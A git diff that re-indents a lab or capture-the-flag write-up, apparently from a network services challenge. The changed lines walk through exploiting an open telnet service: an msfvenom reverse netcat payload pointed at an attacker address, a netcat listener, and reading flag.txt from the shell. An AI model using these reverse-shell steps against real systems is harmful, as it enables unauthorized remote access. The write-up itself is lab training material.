@@ -35,25 +35,25 @@
 
 - **Exploitation Process**:
   
-	- Enter `telnet 10.10.177.199 8012`  now you can connect to the telnet server using the discovered port 8012
+- Enter `telnet 10.10.177.199 8012`  now you can connect to the telnet server using the discovered port 8012
    	
-        ![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/e6bcd72f-8053-46dc-837c-6ca396e0d149)
+![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/e6bcd72f-8053-46dc-837c-6ca396e0d149)
 
-	- Enter `msfvenom -p cmd/unix/reverse_netcat lhost=10.17.64.194 lport=4444 R` to generate a reverse shell payload using msfvenom
+- Enter `msfvenom -p cmd/unix/reverse_netcat lhost=10.17.64.194 lport=4444 R` to generate a reverse shell payload using msfvenom
 	  
-   	![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/56f3c19c-bd00-4d59-98f6-7f47da11b424)
+![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/56f3c19c-bd00-4d59-98f6-7f47da11b424)
 
-  	- Enter `nc -lvp 4444` to start netcat lister to listen for inbound connection and see data
-	![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/cef1919e-40fc-4e27-b83b-7e1cbd3e0f18)
+- Enter `nc -lvp 4444` to start netcat lister to listen for inbound connection and see data
+![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/cef1919e-40fc-4e27-b83b-7e1cbd3e0f18)
 
-	- Copy the payload into the telnet server CLI and press enter
-   	![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/09af501b-3792-4d1d-9fa7-0dc51f9f299d)
+- Copy the payload into the telnet server CLI and press enter
+![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/09af501b-3792-4d1d-9fa7-0dc51f9f299d)
 
-   	- Go to the netcat lister and enter `ls` it will show the file flag.txt
-  	![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/bad9f0bf-77d9-4770-90d3-5240f7384d8a)
+- Go to the netcat lister and enter `ls` it will show the file flag.txt
+![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/bad9f0bf-77d9-4770-90d3-5240f7384d8a)
 
-	- Enter `cat flag.txt` to capture the flag
-   	![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/d4896955-1e10-4cb3-9576-65c33d4684c5)
+- Enter `cat flag.txt` to capture the flag
+![image](https://github.com/abelmorad/Cyber-Defense-Network-Services-Documentation-Challenge-2/assets/110463619/d4896955-1e10-4cb3-9576-65c33d4684c5)
 
 
 ## 4. Analysis and Reflection
